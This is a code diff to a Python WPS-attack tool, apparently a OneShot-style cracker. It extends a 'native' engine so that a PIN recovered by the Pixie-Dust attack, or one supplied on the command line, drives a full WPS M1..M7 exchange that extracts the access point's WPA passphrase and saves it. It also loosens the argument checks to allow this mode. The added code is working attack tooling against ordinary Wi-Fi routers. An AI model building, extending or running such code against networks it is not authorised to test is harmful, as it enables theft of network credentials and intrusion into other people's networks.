@@ -897,6 +897,8 @@ class Companion:
                 print("\nAborting…")
                 self.__savePin(bssid, pin)
                 return False
+        elif self.engine == 'native' and not pixiemode:
+            return self.__native_full_connect(bssid, ssid, pin)
         elif pixiemode and self.engine == 'native':
             self.__collect_pixie_native(bssid, ssid)
         else:
@@ -919,11 +921,11 @@ class Companion:
                 pixiedust_pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if pixiedust_pin:
                     if self.engine == 'native':
-                        # Phase 1: native engine collected the data and pixiewps
-                        # cracked the PIN; report it (full native connect = Phase 2).
+                        # Native engine cracked the PIN; recover the PSK via the
+                        # full native WPS exchange (M1..M7).
                         print(f"[+] WPS PIN recovered (Pixie-Dust): '{pixiedust_pin}'")
                         self.__savePin(bssid, pixiedust_pin)
-                        return True
+                        return self.__native_full_connect(bssid, ssid, pixiedust_pin)
                     return self.__wps_connection(bssid, pixiedust_pin, pixiemode=False)
                 return False
             else:
@@ -957,6 +959,34 @@ class Companion:
         self.pixie_creds.e_hash2 = data['e_hash2']
         self.pixie_creds.authkey = data['authkey']
         self.pixie_creds.e_nonce = data['e_nonce']
+
+    def __native_full_connect(self, bssid, ssid, pin):
+        """Full native WPS PIN exchange (M1..M7) to recover the PSK. No wpa_supplicant."""
+        if not pin:
+            print('[!] Native full connection requires a PIN')
+            return False
+        try:
+            import wps_connect
+        except ImportError:
+            print('[!] Native engine unavailable (wps_connect.py missing)')
+            return False
+        print('[*] Native engine: running full WPS exchange (M1..M7) to recover the PSK…')
+        try:
+            cred = wps_connect.WpsConnection(self.interface, bssid, ssid or '').run(pin)
+        except Exception as e:
+            print('[!] Native WPS connection failed: {}'.format(e))
+            return False
+        if not cred or not cred.get('psk'):
+            print('[-] Native engine did not recover a PSK (wrong PIN or unsupported AP)')
+            return False
+        essid = cred.get('ssid') or ssid or ''
+        self.connection_status.status = 'GOT_PSK'
+        self.connection_status.wpa_psk = cred['psk']
+        self.connection_status.essid = essid
+        self.__credentialPrint(pin, cred['psk'], essid)
+        if self.save_result:
+            self.__saveResult(bssid, essid, pin, cred['psk'])
+        return True
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
         """
@@ -1445,7 +1475,8 @@ if __name__ == '__main__':
         choices=['wpa_supplicant', 'native'],
         default='wpa_supplicant',
         help="WPS engine: 'wpa_supplicant' (default) or 'native' (built-in "
-             "pure-Python nl80211+EAPOL engine; Pixie-Dust only, needs root)"
+             "pure-Python nl80211+EAPOL engine, no wpa_supplicant; needs root; "
+             "supports Pixie-Dust (-K) and full PIN connection (-p))"
         )
     parser.add_argument(
         '--mtk-wifi',
@@ -1467,8 +1498,8 @@ if __name__ == '__main__':
     if os.getuid() != 0:
         die("Run it as root")
 
-    if args.engine == 'native' and not args.pixie_dust:
-        die("--engine native currently supports only the Pixie-Dust attack (-K)")
+    if args.engine == 'native' and not (args.pixie_dust or args.pin):
+        die("--engine native needs -K (Pixie-Dust) or -p <pin> (full PIN connection)")
 
     if args.mtk_wifi:
         wmtWifi_device = Path("/dev/wmtWifi")
